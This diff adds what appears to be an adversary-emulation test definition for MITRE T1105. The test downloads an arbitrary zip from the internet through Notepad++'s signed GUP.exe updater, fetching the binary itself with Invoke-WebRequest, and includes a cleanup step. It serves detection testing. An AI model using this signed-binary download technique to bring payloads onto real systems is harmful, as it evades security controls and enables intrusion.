@@ -1,0 +1,43 @@
+api_version: "2.0"
+name: Arbitrary file download using the Notepad++ GUP.exe binary
+description: |-
+    GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.
+    [Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)
+    Upon execution, a sample zip file will be downloaded to C:\Temp\Sample folder
+args:
+    - name: target_file_url
+      type: string
+      default: https://getsamplefiles.com/download/zip/sample-2.zip
+    - name: working_dir
+      type: path
+      default: PathToAtomicsFolder\T1105\bin\
+    - name: gup_executable
+      type: String
+      default: PathToAtomicsFolder\T1105\bin\GUP.exe
+    - name: target_file_sha256
+      type: string
+      default: CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6
+uuid: 66ee226e-64cb-4dae-80e3-5bf5763e4a51
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1105: Ingress Tool Transfer'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: Gup.exe binary must exist on disk at specified location (#{gup_executable})
+      inline: |-
+        if (Test-Path "#{gup_executable}") {exit 0} else {{New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/bin/GUP.exe" -OutFile "#{gup_executable}"}}
+      executor: powershell
+    - name: arbitrary-file-download-using-the-notepad++-gup.exe-binary
+      inline: |-
+        mkdir "c:\Temp"
+        cd {{.Args.working_dir}}
+        GUP.exe -unzipTo "" "C:\Temp" "Sample {{.Args.target_file_url}} {{.Args.target_file_sha256}}"
+      executor: command_prompt
+      cleanup:
+        inline: rmdir /s /q "C:\Temp\Sample" >nul 2>nul
+        executor: command_prompt
